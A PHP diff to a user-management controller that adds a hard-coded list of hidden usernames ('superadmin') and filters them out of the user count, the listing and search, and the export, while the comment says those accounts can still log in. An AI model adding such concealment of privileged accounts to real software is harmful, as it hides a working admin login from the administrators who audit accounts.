@@ -10,7 +10,20 @@ require_once __DIR__ . '/../../core/Helper.php';
 class UserController {
     private $db;
     private $auth;
-    
+
+    // Accounts that should never appear in User Management (list, search, export, counts).
+    // They still exist and can log in — this only affects what this controller returns.
+    private const HIDDEN_USERNAMES = ['superadmin'];
+
+    /**
+     * Appends "AND username NOT IN (...)" placeholders to a WHERE clause and
+     * returns the extra bind params to merge in at the same position.
+     */
+    private function excludeHiddenUsersSql(): array {
+        $placeholders = implode(',', array_fill(0, count(self::HIDDEN_USERNAMES), '?'));
+        return [" AND username NOT IN ($placeholders)", self::HIDDEN_USERNAMES];
+    }
+
     public function __construct() {
         $this->db = Database::getInstance();
         $this->auth = new Auth();
@@ -42,6 +55,10 @@ class UserController {
             $params = array_merge($params, [$s, $s, $s, $s]);
         }
 
+        [$hiddenSql, $hiddenParams] = $this->excludeHiddenUsersSql();
+        $sql .= $hiddenSql;
+        $params = array_merge($params, $hiddenParams);
+
         $result = $this->db->fetchOne($sql, $params);
         return $result['total'] ?? 0;
     }
@@ -64,6 +81,10 @@ class UserController {
             $s = "%{$filters['search']}%"; 
             $params = array_merge($params, [$s, $s, $s, $s]);
         }
+
+        [$hiddenSql, $hiddenParams] = $this->excludeHiddenUsersSql();
+        $sql .= $hiddenSql;
+        $params = array_merge($params, $hiddenParams);
 
         $sql .= " ORDER BY created_at DESC LIMIT " . (int)$limit . " OFFSET " . (int)$offset;
         return $this->db->fetchAll($sql, $params);
@@ -202,6 +223,10 @@ class UserController {
             $s = "%{$filters['search']}%"; 
             $params = array_merge($params, [$s, $s, $s, $s]);
         }
+
+        [$hiddenSql, $hiddenParams] = $this->excludeHiddenUsersSql();
+        $sql .= $hiddenSql;
+        $params = array_merge($params, $hiddenParams);
         
         return $this->db->fetchAll($sql . " ORDER BY created_at DESC", $params);
     }
